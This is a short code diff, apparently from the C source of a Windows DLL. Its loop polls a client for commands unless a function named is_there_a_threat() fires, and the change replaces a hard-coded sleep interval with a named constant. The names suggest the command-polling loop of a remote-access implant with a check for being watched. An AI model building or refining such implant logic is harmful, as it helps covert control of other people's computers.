@@ -112,7 +112,7 @@ DWORD dll_main(LPVOID param) {
         if (!is_there_a_threat()) {
             get_command(client);
         }
-        sleep(1000 * 10);
+        sleep(1000 * SLEEP_BETWEEN_COMMANDS);
     }
     return 0;
 }
